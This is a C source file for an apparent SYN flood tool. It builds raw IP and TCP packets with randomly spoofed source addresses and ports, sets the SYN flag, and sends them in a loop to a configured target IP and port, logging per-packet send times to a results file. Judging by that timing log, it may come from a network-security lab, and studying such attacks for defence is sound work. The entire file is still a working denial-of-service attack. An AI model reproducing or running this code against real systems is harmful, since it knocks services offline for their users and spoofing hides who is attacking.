#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#include "Attack.h"


uint16_t calculate_ip_checksum(struct iphdr *ip)
{
    uint32_t sum = 0;
    uint16_t *ip_hdr = (uint16_t*)ip;

    for (int i = 0; i < (ip->ihl * 2); i++)
    {
        sum += ntohs(ip_hdr[i]);
    }

    while (sum >> 16) 
    {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    sum = ~sum;

    return (uint16_t)sum;
}


uint16_t calculate_tcp_checksum(struct iphdr *ip, struct tcphdr *tcp)
{
    uint32_t sum = 0;

    sum += (ip->saddr >> 16) & 0xFFFF;
    sum += ip->saddr & 0xFFFF;
    sum += (ip->daddr >> 16) & 0xFFFF;
    sum += ip->daddr & 0xFFFF;
    sum += htons(IPPROTO_TCP);
    sum += htons(sizeof(struct tcphdr));

    uint16_t *tcp_hdr = (uint16_t*) tcp;
    for (int i = 0; i < sizeof(struct tcphdr) / 2; i++)
    {
        sum += ntohs(tcp_hdr[i]);
    }

    if (tcp->doff * 4 > sizeof(struct tcphdr)) {
        sum += ntohs(*(uint16_t*) ((char*) tcp + sizeof(struct tcphdr)));
    }

    while (sum >> 16)
    {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    sum = ~sum;

    return (uint16_t)sum;
}


int get_random_port()
{
    return rand() % (65535 - 1024 + 1) + 1024;
}


char* get_random_ipv4(int sockfd, FILE *file)
{
    char *ipv4 = NULL;
    ipv4 = (char*)calloc(16, sizeof(char));
    if(!ipv4)
    {
        perror("calloc() failed");
        close(sockfd);
        fclose(file);
        exit(errno);

    }
    sprintf(ipv4, "%d.%d.%d.%d", (rand() % 256), (rand() % 256), (rand() % 256), (rand() % 256));
    return ipv4;
}


void set_ip_layer(struct sockaddr_in *target, struct iphdr *ip, int sockfd, FILE *file)
{
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    ip->id = htons(1);
    ip->frag_off = htons(0);
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;

    char *ipv4 = NULL;
    ipv4 = get_random_ipv4(sockfd, file);
    ip->saddr = inet_addr(ipv4);
    free(ipv4);

    ip->daddr = target->sin_addr.s_addr;
    ip->check = calculate_ip_checksum(ip);
}


void set_tcp_layer(struct sockaddr_in *target, struct iphdr *ip, struct tcphdr *tcp)
{
    tcp->source = htons(get_random_port());
    tcp->dest = target->sin_port;
    tcp->seq = htonl(0);
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->fin = 0;
    tcp->syn = 1;
    tcp->rst = 0;
    tcp->psh = 0;
    tcp->ack = 0;
    tcp->urg = 0;
    tcp->window = htons(8192);
    tcp->urg_ptr = 0;
    tcp->check = calculate_tcp_checksum(ip, tcp);
}




int main(int argc, char *argv[])
{
    srand(time(NULL));

    int sock = 0;
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock <= 0)
    {
        perror("socket() failed");
        exit(errno);
    }   

    int buffer_size = 1024 * 1024;
    if(setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(int)) < 0)
    {
        perror("setsockopt() failed");
        close(sock);
        exit(errno);
    }


    FILE *file = NULL;
    file = fopen(RESULTS_FILE, "w");
    if(file == NULL)
    {
        perror("fopen() failed");
        close(sock);
        exit(errno);
    }

    struct sockaddr_in target_addr = {0};
    memset(&target_addr, 0, sizeof(struct sockaddr_in));
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(TARGET_IP_ADDR);
    target_addr.sin_port = htons(TARGET_PORT);

    struct iphdr ip_header = {0};
    memset(&ip_header, 0, sizeof(struct iphdr));

    struct tcphdr tcp_header = {0};
    memset(&tcp_header, 0, sizeof(struct tcphdr));

    char syn_packet[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
    memset(syn_packet, 0, sizeof(syn_packet));

    int i = 0, j = 0;
    size_t sent = 0;

    double avg = 0.0;
    struct timeval start = {0}, end = {0};

    for(i = 0; i < NUM_ITERATIONS; i++)
    {
        for(j = 0; j < NUM_PACKETS; j++)
        {
            set_ip_layer(&target_addr, &ip_header, sock, file);
            set_tcp_layer(&target_addr, &ip_header, &tcp_header);

            memset(syn_packet, 0, sizeof(syn_packet));
            memcpy(syn_packet, &ip_header, sizeof(ip_header));
            memcpy(syn_packet + sizeof(ip_header), &tcp_header, sizeof(tcp_header));

            memset(&start, 0, sizeof(struct timeval));
            memset(&end, 0, sizeof(struct timeval));
            
            gettimeofday(&start, NULL);
            sent = sendto(sock, syn_packet, sizeof(ip_header) + sizeof(tcp_header), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
            gettimeofday(&end, NULL);

            if(sent <= 0)
            {
                perror("sendto() failed");
                close(sock);
                fclose(file);
                exit(errno);
            }

            avg += (end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0;

            fprintf(file, "%d %f\n", (i * NUM_PACKETS + j), ((end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0));
        }
    }

    avg /= NUM_ITERATIONS * NUM_PACKETS;
    fprintf(file, "%f", avg);

    close(sock);
    fclose(file);

    return 0;
}
